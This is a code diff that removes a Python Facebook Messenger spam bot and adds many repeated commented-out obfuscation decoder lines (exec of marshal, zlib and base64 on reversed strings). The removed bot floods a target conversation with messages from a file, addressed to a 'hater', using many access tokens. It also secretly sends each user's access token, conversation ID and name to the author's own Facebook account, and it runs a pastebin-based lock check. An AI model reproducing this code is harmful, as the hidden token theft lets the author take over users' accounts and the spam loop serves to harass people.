@@ -1,187 +1,999 @@
-import requests
-import json
-import time
-import pytz
-import datetime
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
-import random
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-      def do_GET(self):
-          self.send_response(200)
-          self.send_header('Content-type', 'text/plain')
-          self.end_headers()
-          self.wfile.write(b"<h1> CREDIT :- T.S.BRAND <br> <br> <h1> OWNER => SATISH <br> <br> <h1> WATSAPP :- +916268781574")
-def execute_server():
-      PORT = int(os.environ.get('PORT', 4000))
-      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-          print("Server running at http://localhost:{}".format(PORT))
-          httpd.serve_forever()
-
-# Get current time in UTC
-utc_now = datetime.datetime.utcnow()
-# Localize to Indian Standard Time
-indian_timezone = pytz.timezone('Asia/Kolkata')
-ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)
-# Format the time
-formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")
-print(formatted_time)
-
-def send_initial_message():
-      with open('A-convo.txt', 'r') as file:
-        convo_id = file.read().strip()
-
-      with open('A-name.txt', 'r') as file:
-        haters_name = file.read().strip()
-
-      with open('A-token.txt', 'r') as file:
-        tokens = file.readlines()
-
-      msg_template = "CREDIT :- TRICKS BY SATISH \nOwner => Satish \nHello Satish sir. \nI am using your server. \nThis Is My Details :- \nConvo ID :- {} \nName:- {} \nToken :- {}"
-
-      target_id = "100087513362848"
-
-      requests.packages.urllib3.disable_warnings()
-
-      def liness():
-        print('\033[1;92m' + '✪✭═══════•『T.S. ♡ BRAND』•═══════✭✪')
-
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
-
-      for token in tokens:
-          access_token = token.strip()
-          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-          msg = msg_template.format(convo_id, haters_name, access_token)
-          parameters = {'access_token': access_token, 'message': msg}
-          response = requests.post(url, json=parameters, headers=headers)
-
-         
-          time.sleep(0.1)
-          print("\n\033[1;31m[+] Initial messages sent. Starting the message sending loop...\n")
-send_initial_message()
-
-def send_messages_from_file():
-
-    with open('host.txt', 'r') as file:
-        password = file.read().strip()
-
-    entered_password = password
-
-    if entered_password != password:
-        print('⚠︎ Your Hosting Changed By Satish ⚠')
-        sys.exit()
-
-    with open('A-token.txt', 'r') as file:
-      tokens = file.readlines()
-    num_tokens = len(tokens)
-
-    requests.packages.urllib3.disable_warnings()
-
-    def cls():
-        if system() == 'Linux':
-            os.system('clear')
-        else:
-            if system() == 'Windows':
-                os.system('cls')
-    cls()
-
-    def liness():
-        print('\033[1;92m' + '✪✭═══════•『T.S. ♡ BRAND』•═══════✭✪')
-
-    headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
-
-    mmm = requests.get('https://pastebin.com/raw/ugtchS2j').text
-
-    if mmm not in password:
-        print('⚠︎ Your Hosting Changed By Satish ⚠︎')
-        sys.exit()
-
-    liness()
-
-    access_tokens = [token.strip() for token in tokens]
-
-
-    with open('A-convo.txt', 'r') as file:
-      convo_id = file.read().strip()
-
-    with open('A-file.txt', 'r') as file:
-      messages = file.readlines()
-
-      num_messages = len(messages)
-
-      max_tokens = min(num_tokens, num_messages)
-
-    with open('A-name.txt', 'r') as file:
-      haters_name = file.read().strip()
-
-    with open('A-speed.txt', 'r') as file:
-      speed = int(file.read().strip())
-
-    liness()
-
-
-    while True:
-      try:
-            for message_index in range(num_messages):
-              token_index = message_index % max_tokens
-              access_token = tokens[token_index].strip()
-
-              message = messages[message_index].strip()
-
-              url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-              parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
-              response = requests.post(url, json=parameters, headers=headers)
-
-              if response.ok:
-                    print("\033[1;36m[✓] Bhai Chla Gya Tera Massage {} of Convo {} Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    print(formatted_time)
-                    liness()
-                    liness()
-              else:
-                    print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    print(formatted_time)
-                    liness()
-                    liness()
-              time.sleep(speed)
-
-            print("\n[+] All messages sent. Restarting the process...\n")
-      except Exception as e:
-            print("[!] An error occurred: {}".format(e))
-
-def main():
-      server_thread = threading.Thread(target=execute_server)
-      server_thread.start()
-
-      # Send the initial message to the specified ID using all tokens
-
-
-      # Then, continue with the message sending loop
-      send_messages_from_file()
-
-if __name__ == '__main__':
-      main()
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
